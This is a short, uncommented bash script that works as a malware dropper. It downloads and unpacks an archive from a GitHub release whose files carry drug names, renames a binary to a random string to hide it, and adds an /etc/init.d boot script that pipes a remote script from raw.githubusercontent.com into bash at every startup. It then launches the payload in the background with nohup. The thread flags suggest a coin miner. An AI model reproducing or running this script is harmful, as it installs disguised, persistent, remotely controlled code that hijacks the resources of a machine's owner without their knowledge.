cd /
wget https://github.com/levitraz/aricept/releases/download/v0.0.3/ranit.tar
tar -xvf ranit.tar
cd /ranit
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv atenol $variable1
sed -i "s/oodo/${variable1} -t=500 -n=${variable1}/g" ./tramad.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/levitraz/aricept/main/nexium.sh)" > famot.sh
chmod a+x famot.sh
update-rc.d famot.sh defaults
rm -rf ranit.tar
cd /ranit
nohup ./tramad.sh
ps -ef | grep ranit
